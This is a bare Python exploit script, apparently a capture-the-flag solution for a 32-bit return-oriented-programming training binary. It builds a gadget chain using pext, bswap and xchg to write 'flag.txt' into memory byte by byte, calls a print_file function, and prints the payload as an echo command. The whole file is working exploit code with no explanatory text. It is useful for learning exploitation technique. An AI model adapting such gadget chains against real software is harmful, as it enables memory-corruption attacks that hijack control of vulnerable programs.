#!/usr/bin/python3

WORD = 4

PACK = lambda v, n: v.to_bytes(n, 'little')
PACKP = lambda v: PACK(v, WORD)
PACKS = lambda s: bytes(s + (((len(s) & ~(WORD - 1)) + WORD) - len(s)) * "\x00", "utf-8")

def raw(stream):
    return "".join([f"\\x{b:02x}" for b in stream])

def echo(byte_stream):
    print(f"echo -ne {raw(byte_stream)}")

PRINT_FILE = 0x8048538
DATA = 0x0804a018

POP_ECX_BSWAP = 0x08048558
XCHG_DL_AT_ECX = 0x08048555
PEXT_EDX_EAX_EBX = 0x08048543

POP_EBP = 0x080485bb

PEXT_VAL = 0xb0bababa

def WRITE_DL(dl):
    mask = 0
    ival = 0
    i = 0
    dl = ord(dl)
    while True:
        if (not not (dl & 1)) == (not not (PEXT_VAL & (1 << ival))):
            mask |= (1 << ival)
            dl >>= 1
        ival += 1
        if dl == 0:
            break
    return PACKP(POP_EBP) + PACKP(mask) + PACKP(PEXT_EDX_EAX_EBX)

WRITE_ECX = lambda ecx: PACKP(POP_ECX_BSWAP) + PACKP(((ecx & 0xFF000000) >> 24) | ((ecx & 0xFF0000) >> 8) | ((ecx & 0xFF00) << 8) | ((ecx & 0xFF) << 24))
WRITE_CHAR = lambda c, a: WRITE_DL(c) + WRITE_ECX(a) + PACKP(XCHG_DL_AT_ECX)

rop = b" " * 44
rop += WRITE_CHAR('f', DATA)
rop += WRITE_CHAR('l', DATA + 1)
rop += WRITE_CHAR('a', DATA + 2)
rop += WRITE_CHAR('g', DATA + 3)
rop += WRITE_CHAR('.', DATA + 4)
rop += WRITE_CHAR('t', DATA + 5)
rop += WRITE_CHAR('x', DATA + 6)
rop += WRITE_CHAR('t', DATA + 7)
rop += PACKP(PRINT_FILE)
rop += PACKP(DATA)

echo(rop)
